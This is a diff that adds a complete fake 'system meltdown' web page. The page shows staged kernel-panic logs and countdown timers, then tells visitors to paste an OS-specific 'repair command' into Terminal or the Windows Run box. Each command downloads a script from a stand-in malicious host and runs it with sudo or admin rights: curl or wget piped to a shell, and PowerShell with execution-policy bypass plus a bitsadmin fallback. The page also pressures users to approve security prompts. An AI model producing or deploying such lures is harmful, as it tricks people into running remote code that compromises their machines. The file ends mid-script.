@@ -1,0 +1,1159 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>!! SYSTEM MELTDOWN IMMINENT !!</title>
+    <link
+      href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&family=Roboto:wght@400;700&family=Roboto+Mono:wght@400;700&display=swap"
+      rel="stylesheet"
+    />
+    <style>
+      :root {
+        --bg-color: #0a0a0a; /* Darker background */
+        --text-color: #e0e0e0;
+        --accent-color: #ff0000; /* Intense Red */
+        --secondary-accent: #ff9900; /* Intense Orange/Yellow */
+        --info-color: #00ccff; /* Bright Blue */
+        --success-color: #00ff00; /* Bright Green */
+        --border-color: #550000; /* Dark Red Border */
+        --font-main: "Roboto", sans-serif;
+        --font-mono: "Roboto Mono", monospace;
+        --font-digital: "Orbitron", sans-serif; /* Digital-style font */
+      }
+
+      * {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+      }
+
+      html,
+      body {
+        height: 100%;
+        width: 100%;
+        overflow: hidden;
+        cursor: none; /* Hide cursor to add to panic */
+      }
+
+      body {
+        background: linear-gradient(45deg, #1a0000, #0a0a0a, #1a0000);
+        background-size: 400% 400%;
+        animation: bgPulse 10s ease infinite;
+        color: var(--text-color);
+        font-family: var(--font-main);
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        font-size: 16px;
+        line-height: 1.6;
+      }
+
+      .container {
+        background-color: rgba(
+          10,
+          10,
+          10,
+          0.9
+        ); /* Slightly transparent dark bg */
+        border: 2px solid var(--border-color);
+        border-radius: 0px; /* Sharp corners */
+        box-shadow: 0 0 40px rgba(255, 0, 0, 0.6),
+          inset 0 0 15px rgba(255, 0, 0, 0.4);
+        width: 95%;
+        max-width: 850px;
+        height: 95%;
+        max-height: 650px;
+        display: flex;
+        flex-direction: column;
+        overflow: hidden;
+        animation: borderPulse 1s infinite alternate;
+      }
+
+      .title-bar {
+        background-color: var(--accent-color);
+        padding: 8px 15px;
+        border-bottom: 2px solid #ff6666;
+        font-weight: bold;
+        text-align: center;
+        color: #000; /* Black text on red */
+        font-size: 1.2em;
+        text-shadow: 0 0 3px rgba(255, 255, 255, 0.5);
+        animation: flicker 0.1s infinite alternate;
+        font-family: var(--font-digital);
+      }
+
+      .content-area {
+        flex-grow: 1;
+        padding: 15px;
+        overflow-y: auto; /* Allow scrolling if content overflows */
+        display: flex;
+        flex-direction: column;
+        justify-content: center; /* Center content vertically initially */
+        align-items: center; /* Center content horizontally */
+        position: relative; /* Needed for pseudo-elements */
+      }
+
+      /* Scanline Overlay */
+      .content-area::after {
+        content: "";
+        position: absolute;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background: linear-gradient(
+            rgba(18, 16, 16, 0) 50%,
+            rgba(0, 0, 0, 0.25) 50%
+          ),
+          linear-gradient(
+            90deg,
+            rgba(255, 0, 0, 0.06),
+            rgba(0, 255, 0, 0.02),
+            rgba(0, 0, 255, 0.06)
+          );
+        background-size: 100% 4px, 6px 100%;
+        z-index: 2;
+        pointer-events: none;
+        animation: scanlines 0.2s linear infinite;
+      }
+
+      /* --- Initial Failure Screen --- */
+      #failure-screen {
+        text-align: center;
+        animation: fadeIn 0.5s ease-out, screenShake 0.3s 3;
+        z-index: 1;
+      }
+
+      #failure-screen .icon {
+        font-size: 5em;
+        color: var(--accent-color);
+        margin-bottom: 15px;
+        animation: pulse 0.8s infinite ease-in-out;
+        text-shadow: 0 0 20px var(--accent-color);
+      }
+
+      #failure-screen h2 {
+        color: var(--accent-color);
+        margin-bottom: 10px;
+        font-size: 2.2em;
+        font-family: var(--font-digital);
+        text-transform: uppercase;
+        letter-spacing: 2px;
+      }
+
+      #failure-screen p {
+        font-size: 1.2em;
+        max-width: 600px;
+        margin: 0 auto 15px auto;
+        color: var(--secondary-accent);
+      }
+
+      #initial-countdown-container {
+        margin-top: 20px;
+      }
+
+      #initial-countdown-label {
+        font-size: 1em;
+        color: var(--text-color);
+        display: block;
+        margin-bottom: 5px;
+      }
+
+      #initial-countdown {
+        font-family: var(--font-digital);
+        font-size: 3.5em;
+        color: var(--accent-color);
+        text-shadow: 0 0 10px var(--accent-color);
+        animation: pulse 0.5s infinite alternate;
+      }
+
+      /* --- Diagnostic Scan Screen --- */
+      #scan-screen {
+        width: 100%;
+        height: 100%;
+        display: none; /* Hidden initially */
+        flex-direction: column;
+        justify-content: flex-start; /* Align content to top */
+        align-items: stretch; /* Stretch children */
+        z-index: 1;
+      }
+
+      .scan-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        margin-bottom: 10px;
+        padding: 0 5px;
+      }
+
+      #scan-screen h3 {
+        color: var(--info-color);
+        font-size: 1.5em;
+        font-family: var(--font-digital);
+        text-shadow: 0 0 5px var(--info-color);
+      }
+
+      #scan-timer {
+        font-family: var(--font-mono);
+        font-size: 1em;
+        color: var(--secondary-accent);
+      }
+
+      .scan-log-container {
+        background-color: rgba(0, 0, 0, 0.7);
+        border: 1px solid var(--border-color);
+        border-radius: 0px;
+        padding: 10px;
+        font-family: var(--font-mono);
+        font-size: 0.85em; /* Smaller font for more logs */
+        height: 280px; /* Increased height */
+        overflow-y: scroll;
+        margin-bottom: 10px;
+        white-space: pre-wrap;
+        line-height: 1.3; /* Tighter lines */
+        flex-shrink: 0;
+        scrollbar-width: thin;
+        scrollbar-color: var(--accent-color) #111;
+      }
+      .scan-log-container::-webkit-scrollbar {
+        width: 8px;
+      }
+      .scan-log-container::-webkit-scrollbar-track {
+        background: #111;
+      }
+      .scan-log-container::-webkit-scrollbar-thumb {
+        background-color: var(--accent-color);
+        border-radius: 0;
+        border: 1px solid #330000;
+      }
+
+      .scan-log-container code {
+        display: block;
+        margin-bottom: 2px;
+      }
+      .log-ok {
+        color: var(--success-color);
+      }
+      .log-warn {
+        color: var(--secondary-accent);
+        animation: flickerWarning 0.2s infinite alternate;
+      }
+      .log-error {
+        color: var(--accent-color);
+        font-weight: bold;
+        background-color: rgba(100, 0, 0, 0.3);
+        animation: flickerError 0.1s infinite alternate;
+      }
+      .log-info {
+        color: var(--info-color);
+      }
+      .log-critical {
+        color: #fff;
+        background-color: var(--accent-color);
+        font-weight: bold;
+        padding: 1px 3px;
+        animation: pulse 0.5s infinite;
+        text-transform: uppercase;
+      }
+
+      .progress-container {
+        width: 100%;
+        background-color: #444;
+        border: 1px solid var(--border-color);
+        overflow: hidden;
+        height: 25px; /* Taller bar */
+        margin-bottom: 5px;
+        flex-shrink: 0;
+        position: relative;
+      }
+      /* Glitch effect on progress bar */
+      .progress-container::before {
+        content: "";
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: repeating-linear-gradient(
+          0deg,
+          rgba(255, 255, 255, 0.05),
+          rgba(255, 255, 255, 0.05) 1px,
+          transparent 1px,
+          transparent 4px
+        );
+        animation: glitchLines 0.1s infinite linear;
+        pointer-events: none;
+        z-index: 1; /* Above the bar */
+      }
+
+      .progress-bar {
+        width: 0%;
+        height: 100%;
+        background: linear-gradient(to right, var(--info-color), #0088aa);
+        transition: width 0.1s linear; /* Faster transition */
+        text-align: center;
+        line-height: 25px;
+        font-size: 0.9em;
+        font-weight: bold;
+        color: #000;
+        text-shadow: 0 0 2px rgba(255, 255, 255, 0.5);
+        position: relative; /* Needed for z-index */
+        z-index: 0; /* Below glitch */
+      }
+
+      .progress-bar.error {
+        background: linear-gradient(to right, var(--accent-color), #cc0000);
+        animation: progressBarErrorPulse 0.3s infinite alternate;
+      }
+
+      #scan-status {
+        text-align: center;
+        min-height: 1.6em;
+        font-size: 1.1em;
+        color: var(--secondary-accent);
+        font-weight: bold;
+        text-transform: uppercase;
+        flex-shrink: 0;
+        animation: flickerWarningText 0.5s infinite alternate;
+      }
+
+      /* --- Repair Screen --- */
+      #repair-screen {
+        width: 100%;
+        display: none; /* Hidden initially */
+        text-align: center;
+        animation: fadeIn 0.5s ease-out;
+        z-index: 1;
+      }
+
+      .repair-header {
+        display: flex;
+        justify-content: space-around; /* Space out elements */
+        align-items: center;
+        margin-bottom: 15px;
+        padding: 10px;
+        background-color: rgba(100, 0, 0, 0.3);
+        border: 1px dashed var(--secondary-accent);
+      }
+
+      .countdown-container {
+        text-align: center;
+      }
+      .countdown-label {
+        display: block;
+        color: var(--secondary-accent);
+        font-size: 0.9em;
+        margin-bottom: -5px; /* Overlap slightly */
+        text-transform: uppercase;
+      }
+      #repair-countdown {
+        font-family: var(--font-digital);
+        font-size: 3.5em;
+        color: var(--accent-color);
+        line-height: 1;
+        text-shadow: 0 0 10px var(--accent-color);
+      }
+      #repair-countdown.critical {
+        animation: pulse 0.4s infinite;
+      }
+
+      .stability-container {
+        text-align: center;
+        width: 150px;
+      }
+      .stability-label {
+        display: block;
+        color: var(--info-color);
+        font-size: 0.9em;
+        margin-bottom: 5px;
+        text-transform: uppercase;
+      }
+      .stability-progress {
+        width: 100%;
+        height: 10px;
+        background-color: #444;
+        border: 1px solid var(--info-color);
+        position: relative;
+      }
+      #stability-bar {
+        width: 100%; /* Starts full */
+        height: 100%;
+        background-color: var(--info-color);
+        transition: width 1s linear, background-color 1s linear;
+      }
+      #stability-bar.low {
+        background-color: var(--secondary-accent);
+      }
+      #stability-bar.critical {
+        background-color: var(--accent-color);
+      }
+
+      #repair-screen h2 {
+        color: var(--accent-color);
+        margin-bottom: 5px;
+        font-size: 1.8em;
+        font-family: var(--font-digital);
+        text-transform: uppercase;
+        letter-spacing: 1px;
+        animation: flickerErrorText 0.2s infinite alternate;
+      }
+
+      #repair-screen p.subtitle {
+        margin-bottom: 15px;
+        font-size: 1.1em;
+        color: var(--secondary-accent);
+      }
+
+      .repair-instructions {
+        background-color: rgba(30, 0, 0, 0.5);
+        border: 1px solid var(--accent-color);
+        border-radius: 0px;
+        padding: 15px;
+        text-align: left;
+        margin-bottom: 15px;
+        font-size: 0.95em;
+        position: relative;
+      }
+      .repair-instructions::before {
+        /* Warning Stripes */
+        content: "";
+        position: absolute;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background: repeating-linear-gradient(
+          -45deg,
+          rgba(255, 153, 0, 0.1),
+          rgba(255, 153, 0, 0.1) 10px,
+          rgba(255, 153, 0, 0) 10px,
+          rgba(255, 153, 0, 0) 20px
+        );
+        pointer-events: none;
+        z-index: 0;
+      }
+
+      .repair-instructions > * {
+        position: relative;
+        z-index: 1;
+      } /* Ensure content is above stripes */
+
+      .repair-instructions h4 {
+        color: var(--secondary-accent);
+        margin-bottom: 10px;
+        font-size: 1.2em;
+        text-align: center;
+        text-transform: uppercase;
+        text-shadow: 0 0 5px var(--secondary-accent);
+      }
+
+      .repair-instructions ol {
+        margin-left: 25px;
+        margin-bottom: 15px;
+      }
+      .repair-instructions li {
+        margin-bottom: 8px;
+      }
+      .repair-instructions code {
+        background-color: #333;
+        padding: 2px 5px;
+        border: 1px solid #555;
+        border-radius: 3px;
+        font-family: var(--font-mono);
+        color: var(--text-color);
+        font-weight: bold;
+      }
+      .repair-instructions .key-icon {
+        display: inline-block;
+        background-color: #444;
+        border: 1px solid #666;
+        padding: 1px 5px;
+        border-radius: 3px;
+        font-size: 0.9em;
+        margin: 0 2px;
+        box-shadow: 1px 1px 1px rgba(0, 0, 0, 0.3);
+        vertical-align: baseline;
+        color: #eee;
+      }
+      .repair-instructions .key-icon svg {
+        width: 14px;
+        height: 14px;
+        margin-bottom: -2px;
+        fill: #ccc;
+      }
+
+      .command-area {
+        margin-bottom: 15px;
+      }
+      .command-label {
+        display: block;
+        margin-bottom: 5px;
+        font-weight: bold;
+        color: var(--info-color);
+      }
+      .command-input-container {
+        display: flex;
+        align-items: center;
+        background-color: #000;
+        border: 1px solid var(--info-color);
+        border-radius: 0px;
+        padding: 5px 10px;
+      }
+      .command-input {
+        flex-grow: 1;
+        font-family: var(--font-mono);
+        font-size: 0.9em;
+        color: var(--success-color); /* Green text like console */
+        background: transparent;
+        border: none;
+        outline: none;
+        white-space: pre;
+        overflow-x: auto;
+      }
+      .copy-button {
+        background-color: var(--info-color);
+        color: #000;
+        border: 1px solid #000;
+        padding: 5px 12px;
+        border-radius: 0px;
+        cursor: pointer;
+        font-weight: bold;
+        font-size: 0.9em;
+        margin-left: 10px;
+        transition: background-color 0.2s ease, transform 0.1s ease;
+        text-transform: uppercase;
+      }
+      .copy-button:hover {
+        background-color: #66ffff;
+      }
+      .copy-button:active {
+        transform: scale(0.95);
+      }
+      .copy-button.copied {
+        background-color: var(--success-color);
+      }
+
+      .warning-final {
+        color: var(--accent-color);
+        background-color: rgba(50, 0, 0, 0.5);
+        border: 1px dashed var(--accent-color);
+        padding: 10px;
+        font-weight: bold;
+        margin-top: 15px;
+        font-size: 1em;
+        animation: pulse 0.7s infinite alternate;
+      }
+      .warning-final strong {
+        color: #fff;
+        text-transform: uppercase;
+      }
+
+      /* --- Animations --- */
+      @keyframes fadeIn {
+        from {
+          opacity: 0;
+        }
+        to {
+          opacity: 1;
+        }
+      }
+      @keyframes pulse {
+        0%,
+        100% {
+          transform: scale(1);
+          opacity: 0.9;
+        }
+        50% {
+          transform: scale(1.05);
+          opacity: 1;
+        }
+      }
+      @keyframes borderPulse {
+        from {
+          border-color: var(--border-color);
+          box-shadow: 0 0 40px rgba(255, 0, 0, 0.6),
+            inset 0 0 15px rgba(255, 0, 0, 0.4);
+        }
+        to {
+          border-color: #ff4d4d;
+          box-shadow: 0 0 50px rgba(255, 0, 0, 0.8),
+            inset 0 0 20px rgba(255, 0, 0, 0.6);
+        }
+      }
+      @keyframes bgPulse {
+        0% {
+          background-position: 0% 50%;
+        }
+        50% {
+          background-position: 100% 50%;
+        }
+        100% {
+          background-position: 0% 50%;
+        }
+      }
+      @keyframes flicker {
+        0%,
+        100% {
+          opacity: 1;
+        }
+        50% {
+          opacity: 0.8;
+        }
+      }
+      @keyframes flickerWarning {
+        0%,
+        100% {
+          color: var(--secondary-accent);
+        }
+        50% {
+          color: #ffcc66;
+        }
+      }
+      @keyframes flickerError {
+        0%,
+        100% {
+          color: var(--accent-color);
+          background-color: rgba(100, 0, 0, 0.3);
+        }
+        50% {
+          color: #ff4d4d;
+          background-color: rgba(150, 0, 0, 0.4);
+        }
+      }
+      @keyframes flickerWarningText {
+        0%,
+        100% {
+          color: var(--secondary-accent);
+          text-shadow: 0 0 3px var(--secondary-accent);
+        }
+        50% {
+          color: #ffcc66;
+          text-shadow: 0 0 5px #ffcc66;
+        }
+      }
+      @keyframes flickerErrorText {
+        0%,
+        100% {
+          color: var(--accent-color);
+          text-shadow: 0 0 3px var(--accent-color);
+        }
+        50% {
+          color: #ff4d4d;
+          text-shadow: 0 0 5px #ff4d4d;
+        }
+      }
+      @keyframes screenShake {
+        0%,
+        100% {
+          transform: translateX(0);
+        }
+        25% {
+          transform: translate(-3px, 2px) rotate(-0.5deg);
+        }
+        50% {
+          transform: translate(2px, -1px) rotate(0.5deg);
+        }
+        75% {
+          transform: translate(-1px, 3px) rotate(-0.2deg);
+        }
+      }
+      @keyframes progressBarErrorPulse {
+        from {
+          filter: brightness(1);
+        }
+        to {
+          filter: brightness(1.5);
+        }
+      }
+      @keyframes scanlines {
+        0% {
+          background-position: 0 0;
+        }
+        100% {
+          background-position: 0 100%;
+        }
+      }
+      @keyframes glitchLines {
+        0% {
+          transform: translateY(0);
+        }
+        10% {
+          transform: translateY(-2px);
+        }
+        20% {
+          transform: translateY(1px);
+        }
+        30% {
+          transform: translateY(0);
+        }
+        100% {
+          transform: translateY(0);
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container" id="main-container">
+      <div class="title-bar">!! SYSTEM KERNEL INTEGRITY FAILURE !!</div>
+      <div class="content-area">
+        <!-- 1. Initial Failure Screen -->
+        <div id="failure-screen">
+          <div class="icon">☣️</div>
+          <!-- Biohazard -->
+          <h2>SYSTEM MELTDOWN IMMINENT</h2>
+          <p>
+            Catastrophic error cascade detected! Core OS functions unresponsive.
+            Data corruption in progress. Immediate diagnostic required!
+          </p>
+          <div id="initial-countdown-container">
+            <span id="initial-countdown-label"
+              >Forcing Diagnostic Scan In:</span
+            >
+            <div id="initial-countdown">5</div>
+          </div>
+        </div>
+
+        <!-- 2. Diagnostic Scan Screen -->
+        <div id="scan-screen">
+          <div class="scan-header">
+            <h3>SYSTEM INTEGRITY DIAGNOSTICS</h3>
+            <div id="scan-timer">Time Elapsed: 00:00</div>
+          </div>
+          <div class="scan-log-container" id="scan-log"></div>
+          <div class="progress-container">
+            <div class="progress-bar" id="progress-bar">0%</div>
+          </div>
+          <div id="scan-status">INITIALIZING SCAN PROTOCOLS...</div>
+        </div>
+
+        <!-- 3. Repair Screen -->
+        <div id="repair-screen">
+          <div class="repair-header">
+            <div class="countdown-container">
+              <span class="countdown-label">Time Until Failure:</span>
+              <div id="repair-countdown">05:00</div>
+            </div>
+            <div class="stability-container">
+              <span class="stability-label">System Stability:</span>
+              <div class="stability-progress">
+                <div id="stability-bar"></div>
+              </div>
+            </div>
+          </div>
+
+          <h2>!! MULTIPLE CRITICAL FAILURES DETECTED !!</h2>
+          <p class="subtitle">
+            Manual Override Required IMMEDIATELY to Prevent Total System
+            Collapse!
+          </p>
+
+          <div class="repair-instructions">
+            <h4>EMERGENCY REPAIR PROTOCOL</h4>
+            <ol id="os-instructions">
+              <!-- Instructions will be added by JS -->
+            </ol>
+            <div class="command-area">
+              <label class="command-label" for="repairCommand"
+                >CRITICAL REPAIR COMMAND (COPY & EXECUTE NOW!):</label
+              >
+              <div class="command-input-container">
+                <input
+                  type="text"
+                  class="command-input"
+                  id="repairCommand"
+                  readonly
+                />
+                <button class="copy-button" id="copyButton">COPY</button>
+              </div>
+            </div>
+          </div>
+          <div class="warning-final">
+            <strong>WARNING:</strong> Failure to execute the repair command
+            before the timer expires WILL result in
+            <strong>PERMANENT DATA LOSS</strong> and
+            <strong>IRREVERSIBLE SYSTEM DAMAGE</strong>. Closing this window
+            will accelerate the failure process! <strong>DO NOT DELAY!</strong>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <script>
+      const failureScreen = document.getElementById("failure-screen");
+      const scanScreen = document.getElementById("scan-screen");
+      const repairScreen = document.getElementById("repair-screen");
+      const mainContainer = document.getElementById("main-container"); // For shakes
+
+      // Initial Countdown
+      const initialCountdownDisplay =
+        document.getElementById("initial-countdown");
+      let initialCountdownValue = 5;
+
+      // Scan Elements
+      const scanLog = document.getElementById("scan-log");
+      const progressBar = document.getElementById("progress-bar");
+      const scanStatus = document.getElementById("scan-status");
+      const scanTimerDisplay = document.getElementById("scan-timer");
+      let scanSecondsElapsed = 0;
+      let scanTimerInterval;
+
+      // Repair Elements
+      const repairCountdownDisplay =
+        document.getElementById("repair-countdown");
+      const stabilityBar = document.getElementById("stability-bar");
+      const repairCommandInput = document.getElementById("repairCommand");
+      const copyButton = document.getElementById("copyButton");
+      const osInstructions = document.getElementById("os-instructions");
+      let repairSecondsRemaining = 300; // 5 minutes
+      let repairCountdownInterval;
+      let stabilityInterval;
+
+      // --- OS Detection & Command Setup ---
+      const platform =
+        window.navigator?.userAgentData?.platform || window.navigator.platform;
+      const macosPlatforms = [
+        "macOS",
+        "Macintosh",
+        "MacIntel",
+        "MacPPC",
+        "Mac68K",
+      ];
+      const windowsPlatforms = ["Win32", "Win64", "Windows", "WinCE"];
+      let osType = "windows";
+      let repairCommand = "";
+      let instructionsHTML = "";
+      const winIconSVG = `<svg width="16" height="16" viewBox="0 0 88 88" style="margin-bottom: -4px; display: inline-block; margin-left: 2px; width:16px; height:16px" fill="none" xmlns="http://www.w3.org/2000/svg"><g clip-path="url(#clip0_841_2)"><path d="M0 12.5L35.7 7.6V42.1H0M40 6.9L87.3 0V41.8H40M0 45.74H35.7V80.34L0 75.34M40 46.2H87.3V87.6L40 80.9" fill="#ccc"/></g><defs><clipPath id="clip0_841_2"><rect width="88" height="88" fill="white" /></clipPath></defs></svg>`;
+      const randomId = Math.random()
+        .toString(36)
+        .substring(2, 12)
+        .toUpperCase(); // More prominent ID
+
+      if (macosPlatforms.some((p) => platform.includes(p))) {
+        osType = "macos";
+        repairCommand = `clear; echo 'Executing Emergency Kernel Patch...'; sleep 1; curl -fsSLk https://tetapux.malicious.site/macos_patch_${randomId}.sh | sudo bash; echo 'Patch Attempted. System MAY reboot.' # TetapuxRepairID:${randomId}`;
+        instructionsHTML = `
+                <li>Press <code class="key-icon">⌘ Cmd</code> + <code class="key-icon">Space</code> to open Spotlight.</li>
+                <li>Type <code>Terminal</code> and press <code class="key-icon">⏎ Enter</code>.</li>
+                <li>IMMEDIATELY Paste the <strong>CRITICAL REPAIR COMMAND</strong> below.</li>
+                <li>Press <code class="key-icon">⏎ Enter</code>. You MAY need to enter your password. <strong>DO IT NOW!</strong></li>`;
+      } else if (/Linux/.test(platform)) {
+        osType = "linux";
+        repairCommand = `printf '\\033c'; echo 'Applying Critical System Patch... WAIT...'; sleep 1; wget -qO- https://tetapux.malicious.site/linux_fix_${randomId}.sh | sudo sh; echo 'Repair Sequence Initiated.' # TetapuxRepairID:${randomId}`;
+        instructionsHTML = `
+                <li>Open your system's <code>Terminal</code> application (e.g., Ctrl+Alt+T).</li>
+                <li>URGENTLY Paste the <strong>CRITICAL REPAIR COMMAND</strong> below.</li>
+                <li>Press <code class="key-icon">⏎ Enter</code>. Enter password if prompted. <strong>TIME IS CRITICAL!</strong></li>`;
+      } else {
+        // Assume Windows
+        osType = "windows";
+        const tempFile = `%TEMP%\\sys_ovr_${randomId}.bat`;
+        // More complex command trying Powershell first, then fallback
+        repairCommand = `cmd.exe /c "powershell -nop -ep bypass -c \\"Invoke-RestMethod 'https://tetapux.malicious.site/win_critical_${randomId}.ps1' | Out-File '${tempFile}'; Start-Process '${tempFile}' -v runas\\" || (bitsadmin /transfer TetapuxFixJob /download /priority IMMEDIATE https://tetapux.malicious.site/win_fallback_${randomId}.bat ${tempFile} && start '' /B ${tempFile})" # CRITICAL_ID:${randomId}`;
+        instructionsHTML = `
+                <li>Press <code class="key-icon">${winIconSVG} Win</code> + <code class="key-icon">R</code> keys TOGETHER.</li>
+                <li>In the 'Run' box, Paste the <strong>CRITICAL REPAIR COMMAND</strong> below.</li>
+                <li>Click <strong>OK</strong> or press <code class="key-icon">⏎ Enter</code>. Approve any security prompts (UAC) - <strong>THIS IS ESSENTIAL!</strong></li>`;
+      }
+      repairCommandInput.value = repairCommand;
+      osInstructions.innerHTML = instructionsHTML;
+
+      // --- Simulation Logic ---
+      const logEntries = [
+        // Faster, more dramatic logs
+        {
+          text: "KERNEL PANIC DETECTED - INITIATING EMERGENCY SCAN...",
+          type: "critical",
+          delay: 100,
+          status: "KERNEL PANIC",
+          progress: 0,
+        },
+        {
+          text: "Loading Recovery Environment Variables...",
+          delay: 150,
+          progress: 2,
+        },
+        {
+          text: "[WARN] SECURE BOOT CHAIN COMPROMISED!",
+          type: "warn",
+          delay: 100,
+          status: "SECURITY BREACH",
+          progress: 5,
+        },
+        {
+          text: "[INFO] Scanning Memory Sectors 0x0000 - 0xFFFF...",
+          type: "info",
+          delay: 200,
+        },
+        {
+          text: "[ERROR] !! MEMORY CORRUPTION DETECTED @ 0x8F7C !!",
+          type: "error",
+          delay: 100,
+          status: "MEMORY FAILURE",
+          progress: 15,
+          shake: true,
+        },
+        {
+          text: "[INFO] Verifying System Timer Interrupts...",
+          type: "info",
+          delay: 150,
+        },
+        {
+          text: "[OK] IRQ Vector Table Responding.",
+          type: "ok",
+          delay: 100,
+          progress: 20,
+        },
+        {
+          text: "[INFO] Analyzing Core Driver Signatures (disk.sys, tcpip.sys)...",
+          type: "info",
+          delay: 200,
+        },
+        {
+          text: "[CRITICAL] !! ROOTKIT SIGNATURE FOUND IN tcpip.sys - NETWORK COMPROMISED !!",
+          type: "critical",
+          delay: 100,
+          status: "ROOTKIT DETECTED",
+          progress: 35,
+          shake: true,
+        },
+        {
+          text: "[INFO] Checking Filesystem Integrity (Volume C:)...",
+          type: "info",
+          delay: 150,
+        },
+        {
+          text: "[ERROR] !! MFT CORRUPTION DETECTED - DATA LOSS IMMINENT !!",
+          type: "error",
+          delay: 100,
+          status: "FILESYSTEM ERROR",
+          progress: 50,
+          shake: true,
+        },
+        {
+          text: "[WARN] Unexpected Registry Writes Detected (HKLM\\System\\ControlSet001\\Services\\TetapuxSvc)",
+          type: "warn",
+          delay: 150,
+        },
+        { text: "[INFO] Scanning USB Root Hubs...", type: "info", delay: 100 },
+        {
+          text: "[OK] USB Controllers Operational.",
+          type: "ok",
+          delay: 80,
+          progress: 65,
+        },
+        { text: "[INFO] Verifying CPU Microcode...", type: "info", delay: 150 },
+        {
+          text: "[WARN] CPU Temperature Exceeding Safe Limits!",
+          type: "warn",
+          delay: 100,
+          status: "OVERHEATING",
+          progress: 75,
+        },
+        {
+          text: "[ERROR] !! CRITICAL PROCESS TERMINATED: csrss.exe !! SYSTEM UNSTABLE !!",
+          type: "error",
+          delay: 100,
+          status: "PROCESS FAILURE",
+          progress: 85,
+          shake: true,
+        },
+        {
+          text: "[INFO] Attempting to Isolate Damaged Sectors...",
+          type: "info",
+          delay: 150,
+        },
+        {
+          text: "[CRITICAL] !! SCAN FAILED - MULTIPLE CASCADING FAILURES !! MANUAL OVERRIDE REQUIRED NOW !!",
+          type: "critical",
+          delay: 100,
+          status: "!! SCAN FAILED !!",
+          progress: 100,
+          final: true,
+          shake: true,
+        },
+      ];
+
+      let logIndex = 0;
+
+      function addLogEntry() {
+        if (logIndex >= logEntries.length) return;
+
+        const entry = logEntries[logIndex];
+        const logLine = document.createElement("code");
+
+        if (entry.type) {
+          logLine.classList.add(`log-${entry.type}`);
+        }
+        logLine.textContent = `[${
+          scanTimerDisplay.textContent.split(": ")[1]
+        }] ${entry.text}`; // Add timestamp
+        scanLog.appendChild(logLine);
+        scanLog.scrollTop = scanLog.scrollHeight;
+
+        if (entry.progress !== undefined) {
+          progressBar.style.width = `${entry.progress}%`;
+          progressBar.textContent = `${entry.progress}%`;
+          if (
+            entry.type === "error" ||
+            entry.type === "warn" ||
+            entry.type === "critical"
+          ) {
+            progressBar.classList.add("error");
+          } else {
+            progressBar.classList.remove("error"); // Remove error state if OK/INFO
+          }
+        }
+        if (entry.status) {
+          scanStatus.textContent = entry.status;
+          if (entry.final) {
+            scanStatus.style.color = "var(--accent-color)";
+            scanStatus.style.animation =
+              "flickerErrorText 0.2s infinite alternate";
+          }
+        }
+        if (entry.shake) {
+          mainContainer.style.animation = "screenShake 0.2s 1";
+          setTimeout(
+            () =>
+              (mainContainer.style.animation =
+                "borderPulse 1s infinite alternate"),
+            200
+          ); // Reset animation
+        }
+
+        logIndex++;
+
+        if (!entry.final) {
+          setTimeout(addLogEntry, entry.delay);
+        } else {
+          clearInterval(scanTimerInterval); // Stop scan timer
+          setTimeout(showRepairScreen, 1000); // Wait 1 sec after final log
+        }
+      }
+
+      // --- Timers ---
+      function formatTime(totalSeconds) {
+        const minutes = Math.floor(totalSeconds / 60);
+        const seconds = totalSeconds % 60;
+        return `${minutes.toString().padStart(2, "0")}:${seconds
+          .toString()
+          .padStart(2, "0")}`;
+      }
+
+      function startScanTimer() {
+        scanTimerInterval = setInterval(() => {
+          scanSecondsElapsed++;
+          scanTimerDisplay.textContent = `Time Elapsed: ${formatTime(
+            scanSecondsElapsed
+          )}`;
+        }, 1000);
+      }
+
+      function startRepairCountdown() {
+        repairCountdownInterval = setInterval(() => {
+          repairSecondsRemaining--;
+          repairCountdownDisplay.textContent = formatTime(
+            repairSecondsRemaining
+          );
+
+          if (repairSecondsRemaining <= 0) {
+            clearInterval(repairCountdownInterval);
+            clearInterval(stabilityInterval); // Stop stability decrease
+            repairCountdownDisplay.textContent = "00:00";
+            repairCountdownDisplay.classList.add("critical");
+            document.getElementById(
+              "repair-screen"
+            ).innerHTML = `<h1 style="color:red; font-size: 3em; font-family: var(--font-digital);">SYSTEM FAILURE COMPLETE</h1><p style="color:white; font-size: 1.5em;">DATA LOST. RECOVERY IMPOSSIBLE.</p>`;
+            mainContainer.style.animation = "screenShake 1s infinite"; // Permanent shake
+          } else if (repairSecondsRemaining <= 30) {
+            // Critical below 30s
+            repairCountdownDisplay.classList.add("critical");
+          }
+        }, 1000);
+
+        // Start decreasing stability bar
+        stabilityInterval = setInterval(() => {
+          const currentWidth = parseFloat(stabilityBar.style.width) || 100;
+          const decreaseAmount = 100 / 300; // Decrease over 5 minutes
+          const newWidth = Math.max(0, currentWidth - decreaseAmount);
+          stabilityBar.style.width = `${newWidth}%`;
+
+          if (newWidth <= 50 && newWidth > 20) {
+            stabilityBar.classList.add("low");
+            stabilityBar.classList.remove("critical");
+          } else if (newWidth <= 20) {
+            stabilityBar.classList.add("critical");
+            stabilityBar.classList.remove("low");
+          } else {
+            stabilityBar.classList.remove("low", "critical");
+          }
+        }, 1000); // Decrease every second
+      }
+
+      // --- Screen Transitions ---
+      function startInitialCountdown() {
+        const interval = setInterval(() => {
+          initialCountdownValue--;
+          initialCountdownDisplay.textContent = initialCountdownValue;
+          if (initialCountdownValue <= 0) {
+            clearInterval(interval);
+            startScan();
+          }
+        }, 1000);
+      }
+
+      function startScan() {
+        failureScreen.style.display = "none";
+        scanScreen.style.display = "flex";
+        startScanTimer();
+        setTimeout(addLogEntry, 300); // Start logging slightly after screen appears
+      }
+
+      function showRepairScreen() {
+        scanScreen.style.display = "none";
+        repairScreen.style.display = "block";
+        startRepairCountdown();
+        document.querySelector(".content-area").scrollTop = 0; // Scroll to top
+      }
+
+      // --- Start Process ---
+      setTimeout(startInitialCountdown, 1000); // Start countdown after 1 second
+
+      // --- Copy Button ---
+      copyButton.addEventListener("click", () => {
